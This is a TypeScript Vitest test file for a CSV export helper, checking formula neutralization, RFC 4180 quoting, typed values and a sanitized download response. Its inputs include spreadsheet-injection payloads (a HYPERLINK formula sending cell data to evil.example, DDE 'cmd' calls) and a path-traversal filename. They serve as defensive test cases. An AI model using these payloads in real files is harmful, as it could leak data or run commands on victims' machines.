import { Prisma } from "@prisma/client";
import { describe, expect, it } from "vitest";
import { csvCell, csvDownloadResponse, csvRow, toCsv } from "./csv.server";

describe("csvCell formula neutralization", () => {
  it.each([
    ['=HYPERLINK("http://evil.example/?x="&A1,"Click")', `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")"`],
    ["+1+cmd|' /C calc'!A0", "'+1+cmd|' /C calc'!A0"],
    ["-2+3+cmd|' /C calc'!A0", "'-2+3+cmd|' /C calc'!A0"],
    ["@SUM(1+1)", "'@SUM(1+1)"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", `"'\r=1+1"`],
    ["  =1+1", "'  =1+1"],
    ["＝1+1", "'＝1+1"],
    ["＠SUM(A1)", "'＠SUM(A1)"],
  ])("neutralizes %j", (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it.each(["Widget", "Blue = Large", "a@b.example", "Size - XL"])(
    "leaves ordinary text %j alone",
    (input) => {
      expect(csvCell(input)).toBe(input);
    },
  );

  it.each(["-12.50", "+3", "0.0001", "-1e5", "42", ".5"])(
    "keeps numeric string %j verbatim",
    (input) => {
      expect(csvCell(input)).toBe(input);
    },
  );
});

describe("csvCell typed values", () => {
  it("emits numbers, bigints and booleans verbatim", () => {
    expect(csvCell(-4)).toBe("-4");
    expect(csvCell(12.5)).toBe("12.5");
    expect(csvCell(9007199254740993n)).toBe("9007199254740993");
    expect(csvCell(true)).toBe("true");
  });

  it("emits Prisma Decimals exactly, including negatives", () => {
    expect(csvCell(new Prisma.Decimal("-1234.5600"))).toBe("-1234.56");
    expect(csvCell(new Prisma.Decimal("0.1").plus("0.2"))).toBe("0.3");
  });

  it("emits empty fields for null, undefined and non-finite numbers", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(Number.NaN)).toBe("");
    expect(csvCell(Number.POSITIVE_INFINITY)).toBe("");
  });

  it("emits dates as ISO-8601 UTC", () => {
    expect(csvCell(new Date("2026-11-10T12:00:00Z"))).toBe("2026-11-10T12:00:00.000Z");
    expect(csvCell(new Date("invalid"))).toBe("");
  });
});

describe("RFC 4180 quoting", () => {
  it("quotes delimiters, quotes, line breaks and edge whitespace", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(csvCell(" padded ")).toBe('" padded "');
  });

  it("builds rows and documents with CRLF line endings", () => {
    expect(csvRow(["Title", 3, null])).toBe("Title,3,");
    expect(toCsv(["Variant", "Qty"], [["=1+1", 2], ["Widget", -1]])).toBe(
      "Variant,Qty\r\n'=1+1,2\r\nWidget,-1\r\n",
    );
  });
});

describe("csvDownloadResponse", () => {
  it("serves a private, non-sniffable attachment with a sanitized filename", async () => {
    const response = csvDownloadResponse("a,b\r\n", 'report"; x=../../etc.csv');

    expect(response.headers.get("Content-Type")).toBe("text/csv; charset=utf-8");
    expect(response.headers.get("Content-Disposition")).toBe(
      'attachment; filename="report-x-..-..-etc.csv"',
    );
    expect(response.headers.get("Cache-Control")).toBe("private, no-store");
    expect(response.headers.get("X-Content-Type-Options")).toBe("nosniff");
    expect(await response.text()).toBe("a,b\r\n");
  });
});
